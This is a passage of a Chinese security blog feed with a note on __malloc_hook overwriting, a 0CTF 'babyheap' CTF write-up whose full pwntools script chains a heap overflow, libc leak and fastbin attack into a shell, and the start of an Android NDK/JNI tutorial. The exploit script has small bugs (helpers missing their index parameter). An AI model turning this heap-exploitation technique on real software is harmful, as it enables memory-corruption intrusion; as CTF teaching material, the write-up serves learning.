<h3 id="B-用堆getshell"><a href="#B-用堆getshell" class="headerlink" title="B.用堆getshell"></a>B.用堆getshell</h3><p>​        1.首先我们需要知道，创建堆时填充数据的位置在chunk_ptr + 0x10（即free chunk的FD BK指针处）的位置，而前面0x10用来存放堆结构的部分信息，其中很重要的一个信息就是chunk_size。在创建堆时chunk_size是避免检查，决定填充偏移的关键。</p>
<p>​        2.由此我们需要在malloc_hook附近找一个合适的“chunk_size”，也就是说，用该地址处的数据充当chunk_size，而且要让其满足fastchunk的大小。经过实验，可以找到main_ arena - 0x40 + 0xd 这个位置（不理解的话可以0x0 – 0x10 都试一下，找最合适的偏移）。<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/malloc/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /></p>
<p>​        在此偏移处的0x7f这个字节恰好满足需求，属于fastchunk。所以我们可以在这个地址malloc（0x60），系统就会给我们分配0x70的空间，也满足0x7f的chunksize。</p>
<p>​        3.申请好chunk之后，我们还需要知道偏移量。假设我们已经leak出了libc_base，那么就可以根据main_arena在libc上的固定偏移并通过计算得知以下关系：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main_arena == libc_base + <span class="number">0x3c4b20</span> </span><br><span class="line">chunk_addr == main_arena - <span class="number">0x40</span> + <span class="number">0xd</span></span><br><span class="line">chunk_addr == libc_base + <span class="number">0x3c4b20</span> - <span class="number">0x40</span> + <span class="number">0xd</span></span><br><span class="line">chunk_addr == libc_base + <span class="number">0x3c4aed</span></span><br><span class="line">malloc_hook== main_arena - <span class="number">0x10</span></span><br><span class="line">fill_size  == malloc_hook - chunk_addr</span><br><span class="line">fill_size  == <span class="number">0x23</span></span><br></pre></td></tr></table></figure>

<p>​        所以说我们需要填充的大小就是0x23。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">3</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(shellcode)</span><br></pre></td></tr></table></figure>

<p>​            4.填充好之后，再进行一次malloc()就可以getshell了。</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastbin attack (Babyheap)</title>
    <url>/2020/02/29/Fastbin_attack(Babyheap)/</url>
    <content><![CDATA[<p>​        利用malloc_hook解题。<span id="more"></span></p>
<h2 id="1-关于Fast-bin"><a href="#1-关于Fast-bin" class="headerlink" title="1.关于Fast_bin"></a>1.关于Fast_bin</h2><p>​        fast bin和其他的bin一样，都是一种用来记录free chunk的<strong>链表数据结构</strong>有单链表有双链表，因种类不同功能不同而采用不同的结构。fast bin专门使用于存放比较小的chunk，具体为16 bytes – 80 bytes（此处指malloc的实际大小）fast bin的设计初衷就是进行快速的<strong>小内存</strong>分配和释放，因此fast chunk之间是不进行合并的，即不存在unlink。因此其 next_chunk 的 prev_inuse 位也不会被清空。，也就催生了fast bin的漏洞。</p>
<h2 id="2-babyheap复现"><a href="#2-babyheap复现" class="headerlink" title="2.babyheap复现"></a>2.babyheap复现</h2><h3 id="A-题目分析"><a href="#A-题目分析" class="headerlink" title="A.题目分析"></a>A.题目分析</h3><ul>
<li><p>Link – <a href="https://uaf.io/assets/0ctfbabyheap">https://uaf.io/assets/0ctfbabyheap</a></p>
<p>常规操作：丢ubuntu分析：保护全开，一般都是堆题。。</p>
<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/4.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4" style="zoom: 57%;" /></div>
丢ida_64分析：

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">sub_B70</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">Read</span>();</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( off_14F4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        <span class="built_in">Add</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        <span class="built_in">Fill</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        <span class="built_in">Free</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">        <span class="built_in">Dump</span>(v4);                             </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Add()：新建chunk,由用户输入size,用calloc分配内存,先行初始化chunk。</p>
</li>
<li><p>Fill()：写入chunk,由用户决定size，与Add()size不同,所以存在堆溢出。</p>
</li>
<li><p>Free()：删除chunk,而且指针置空,不存在UAF漏洞。</p>
</li>
<li><p>Dump()：输出chunk,没啥特别。</p>
<p>另外还有一点就是，文件存在alarm()函数，因此在调试时有时间限制。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" />

<p>不过只要在伪代码中，将汇编指令修改一下，将call alarm改成nop就行。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>所以说我们可以利用的只有堆溢出这一个漏洞。</p>
<h3 id="B-Leak-Libc-base"><a href="#B-Leak-Libc-base" class="headerlink" title="B.Leak  Libc_base"></a>B.Leak  Libc_base</h3><p>对于这个题目可以进行fastbin_attack,先新建5个chunk，大小功能如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  Add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite</span></span><br><span class="line">  Add(<span class="number">0x20</span>)			</span><br><span class="line">  Add(<span class="number">0x20</span>)		<span class="comment">#used to point the same aera of chunk4</span></span><br><span class="line">  Add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite</span></span><br><span class="line">Add(<span class="number">0x80</span>)		<span class="comment">#used to leak the libc_base</span></span><br></pre></td></tr></table></figure>

<p>各个堆块结构如下：</p>
<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/5.jpg" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:20%;" /></div>
​    根据堆结构，填充空余部分时要这样写脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  payload = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">31</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">31</span>)  + p8(<span class="number">0xC0</span>)</span><br></pre></td></tr></table></figure>

<p>​        p8(0xC0)也就刚好覆盖到了chunk2的FD指针。接着就是一系列内存布局，目的是让leak出small chunk2的FD指针，因为当程序中只有一个small/unsort chunk在链表上时，其FD和BK都指向距离main_arena 0x58的地址。也就是说：</p>
<ol>
<li><p>Leak_addr - 0x58 = main_arena</p>
</li>
<li><p>main_arena - 0x3c4b20 = libc_base</p>
<p>内存布局如下(非实际脚本，仅用于理解)：</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  free(chunk1)	main_arena--&gt;chunk1</span><br><span class="line">  free(chunk2)	main_arena--&gt;chunk2--&gt;chunk1</span><br><span class="line">  fill(chunk0)	main_arena--&gt;chunk2--&gt;chunk4 #overwrite</span><br><span class="line">  fill(chunk3)	<span class="comment">#modify the size of chunk4 (0x91 --&gt; 0x31)</span></span><br><span class="line">  <span class="comment">#so we can malloc chunk4 as fastbin</span></span><br><span class="line">  add(0x20)		main_arena--&gt;chunk4&lt;--chunk2</span><br><span class="line">  add(<span class="number">0x20</span>)		main_arena   chunk4&lt;--chunk2 <span class="comment">#share the same addr</span></span><br><span class="line">  fill(chunk3)	<span class="comment">#modify the size of chunk4 (0x91 --&gt; 0x31)</span></span><br><span class="line"><span class="comment">#so we can pass the check and free chunk4 as smallbin</span></span><br><span class="line">  add(<span class="number">0x80</span>)		<span class="comment">#chunk 5 , for avoiding the merging into top_chunk</span></span><br><span class="line">free(chunk4)	main_arena-<span class="number">0x58</span>&lt;--chunk4&lt;--chunk2</span><br><span class="line">  dump(chunk2)	<span class="comment">#Leak libc_base</span></span><br></pre></td></tr></table></figure>

<p>​        经过布局之后可以使得chunk2和chunk4指向相同。</p>
<h3 id="C-Getshell"><a href="#C-Getshell" class="headerlink" title="C. Getshell"></a>C. Getshell</h3><p>​        那么现在有了libc_base要怎么利用咧。可以通过<strong>one_gadget</strong>搜libc里的excute(“/bin/sh”)，搜出来的不止一个，需要一个个尝试，再找机会调用运行。今天新学到的一个小姿势：main_arena上方有一个函数指针叫<strong>malloc_hook</strong>，正常情况下为空，但如果系统在调用malloc， realloc，free时监测到malloc_hook非空就会立即执行malloc_hook中的汇编指令。针对malloc_hook的攻击会另外再写一篇小记。</p>
<p>​        所以说利用思路就是：可以利用堆，修改堆的FD指针指向malloc_hook的一定偏移处，使得fill(chunk)时可以恰好覆盖到malloc_hook并执行。</p>
<ol>
<li>将chunk4申请出来并将其大小压缩在fastchunk的范围。</li>
<li>释放chunk4，此时用chunk2覆写chunk4的FD指针，使其指向距离malloc_hook的一定偏移处。(准确地址为libc_base+0x3C4AED，在此处恰好可以分配到合适的fastbin，这里的偏移计算涉及malloc_hook攻击。)</li>
<li>申请两个chunk(fastchunk)，第一次会分配到chunk4，第二次会分配到新的chunk6，chunk6的地址正是目标地址。</li>
<li>将shellcode写入到chunk6。</li>
<li>执行一次add()即可getshell。</li>
</ol>
<h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D.Exploit"></a>D.Exploit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:  &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:  &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	<span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite									0x..............00</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#												   0x..............30</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#used to point the same aera of chunk4				  0x..............60</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite									0x..............90</span></span><br><span class="line">add(<span class="number">0x80</span>)		<span class="comment">#used to leak the libc_base							 0x..............C0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0xC0</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)	<span class="comment">#now the chunk2 is pointing at the chunk4, they share the same addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#In order to draw the chunk4 into fastbin ,its size need to be modified</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)	<span class="comment">#now the size of chunk4 is 0x30,we can easily malloc it as a fastchunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#chunk2</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#chunk4</span></span><br><span class="line"><span class="comment">#In order to put the chunk4 into smallbin ,its size need to be modified</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)	 <span class="comment">#now the size of chunk4 is 0x90,we can easily free it as a smallchunk</span></span><br><span class="line">add(<span class="number">0x80</span>)			<span class="comment">#avoid merging into top_chunk :chunk5</span></span><br><span class="line">free(<span class="number">4</span>)			<span class="comment">#here we&#x27;ve got the fd ptr of chunk4,which is pointing at main_arena-0x58 while it was freed</span></span><br><span class="line">fd_ptr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</span><br><span class="line">main_arena = fd_ptr - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span>	<span class="comment">#0x3c4b20 is the offset of main_arena in libc</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)		<span class="comment">#transform the chunk4 into fastchunk again,so we are able to fastbin attack</span></span><br><span class="line">free(<span class="number">4</span>)				</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(main_arena - <span class="number">0x33</span>)	</span><br><span class="line"><span class="comment">#the same as : malloc_hook-0x23 || libc_base+0x3C4B20-0x33 || libc_base - 0x3C4AED</span></span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)			<span class="comment">#chunk 4</span></span><br><span class="line">add(<span class="number">0x60</span>)			<span class="comment">#chunk 6</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">3</span>	<span class="comment">#length of &quot;AAA&quot;+p64(0)*2 = 0x23,it&#x27;s the very length to fill the malloc_hook</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload+=p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)			<span class="comment">#add() to call excute(&quot;/bin/sh&quot;)  &quot;1&quot;has not meaning</span></span><br><span class="line">p.interactive()	</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>NDK开发</title>
    <url>/2021/02/27/NDK%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<p>用C/C++开发Android<span id="more"></span></p>
<p>Android工程一般由java语言编写，但是可以通过NDK调用native方法来执行C/C++的代码，后者代码中的标识符需要在工程中进行注册，以便在java被一一对应地找到并正确调用。下面介绍关于native方法的开发过程。</p>
<h2 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h2><h3 id="编写-java"><a href="#编写-java" class="headerlink" title="编写.java"></a>编写.java</h3><p>在java文件中声明需要用到的native函数，无需编写方法体。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LQGEd.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LQGEd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>声明后插入如下代码，以便运行时加载native库。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">		System.loadLibrary(<span class="string">&quot;strjni&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="生成-h"><a href="#生成-h" class="headerlink" title="生成.h"></a>生成.h</h3><p>在src文件夹运行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javah -jni com.example.ndktest.MainActivity</span><br></pre></td></tr></table></figure>

<p>在工程目录新建文件夹”jni”，将src文件夹下生成的.h重命名后移动到此处。</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LQJUA.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LQJUA.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<h3 id="编写mk文件"><a href="#编写mk文件" class="headerlink" title="编写mk文件"></a>编写mk文件</h3><p>在jni文件夹新建两个makefile文件，此类文件用于描述编译的相关配置。文件名及内容如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Android.mk</span></span><br><span class="line">LOCAL_PATH := <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span>   </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span>  </span><br><span class="line">LOCAL_MODULE    := strjni  	<span class="comment">#模块名称  </span></span><br><span class="line">LOCAL_SRC_FILES := strjni.c <span class="comment">#源文件  .c或者.cpp</span></span><br><span class="line">LOCAL_ARM_MODE := arm       <span class="comment">#编译后的指令集 ARM指令</span></span><br><span class="line">LOCAL_LDLIBS += -llog       <span class="comment">#依赖库    </span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_SHARED_LIBRARY)</span> <span class="comment">#指定编译文件的类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Application.mk</span></span><br><span class="line">APP_ABI := armeabi-v7a</span><br></pre></td></tr></table></figure>

<h3 id="编写-c，编译"><a href="#编写-c，编译" class="headerlink" title="编写.c，编译"></a>编写.c，编译</h3><p>根据.h中的声明，在.c文件中编写native函数的函数体。详细编写分为静态注册与动态注册。</p>
<p>在jni目录下执行如下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ndk<span class="literal">-build</span></span><br></pre></td></tr></table></figure>

<h3 id="运行调试"><a href="#运行调试" class="headerlink" title="运行调试"></a>运行调试</h3><p>构建工程，连接AVD并且运行调试。</p>
<h2 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h2><p>通过 JNIEXPORT 和 JNICALL 两个宏定义声明，程序加载so时会根据上面的宏定义声明链接到对应的native函数。</p>
<h3 id="Exp："><a href="#Exp：" class="headerlink" title="Exp："></a>Exp：</h3><p>在Java code中声明如下函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_str</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_strstatic_str</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_string_from_c</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>用 <strong>javah -jni 包名+类名</strong>命令生成如下.h文件：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef _Included_com_example_jinstudy_MainActivity</span><br><span class="line">#define _Included_com_example_jinstudy_MainActivity</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_example_jinstudy_MainActivity</span></span><br><span class="line"><span class="comment"> * Method:    get_str</span></span><br><span class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str</span><br><span class="line">  (JNIEnv *, jobject);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_example_jinstudy_MainActivity</span></span><br><span class="line"><span class="comment"> * Method:    get_strstatic_str</span></span><br><span class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_strstatic_str</span><br><span class="line">  (JNIEnv *, jobject);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     com_example_jinstudy_MainActivity</span></span><br><span class="line"><span class="comment"> * Method:    get_string_from_c</span></span><br><span class="line"><span class="comment"> * Signature: ()Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_string_from_c</span><br><span class="line">  (JNIEnv *, jobject);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<p>我们发现原本Java中的String类型，变成了C中的jstring类型，这是两种语言在数据结构上的映射。详细对应情况如下：</p>
<p><img src="https://z3.ax1x.com/2021/03/25/6LQY4I.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LQY4I.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>引入上述.h，编写如下.c文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;JNIstudy.h&gt;</span></span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str_from_c</span><br><span class="line">  (JNIEnv *env, jobject obj)&#123;</span><br><span class="line">	<span class="comment">//类型转换 NewStringUTF(env，字符串)</span></span><br><span class="line">	 jstring str= (*env)-&gt;NewStringUTF(env, <span class="string">&quot;Test&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用java层普通字段</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str</span><br><span class="line">  (JNIEnv *env, jobject obj)&#123;</span><br><span class="line">	<span class="comment">//1.获取类</span></span><br><span class="line">	<span class="comment">//FindClass:第一个env，第二个：字段所在类的路径（点换成斜杠）</span></span><br><span class="line">	jclass    _jclass = (*env)-&gt;FindClass(env,<span class="string">&quot;com/example/jinstudy/MainActivity&quot;</span>);</span><br><span class="line">	<span class="comment">//2.获取字段ID</span></span><br><span class="line">	<span class="comment">//GetFieldID:第一个env，第二个FindClass的返回值，第三个java层字段的名称，第四个java层字段的签名</span></span><br><span class="line">	 jfieldID  _jfieldID = (*env)-&gt;GetFieldID(env, _jclass, <span class="string">&quot;ZD&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">	 <span class="comment">//3.获取字段</span></span><br><span class="line">	 <span class="comment">//GetObjectField:第一个env，第二个obj，第三个GetFieldID的返回值</span></span><br><span class="line">	 jobject   str= (*env)-&gt;GetObjectField(env, obj, _jfieldID);</span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用java层静态字段</span></span><br><span class="line">JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_static_str</span><br><span class="line">  (JNIEnv *env, jobject obj)&#123;</span><br><span class="line">	<span class="comment">//1.获取类：FindClass（）</span></span><br><span class="line">	jclass _jclass = (*env)-&gt;FindClass(env,<span 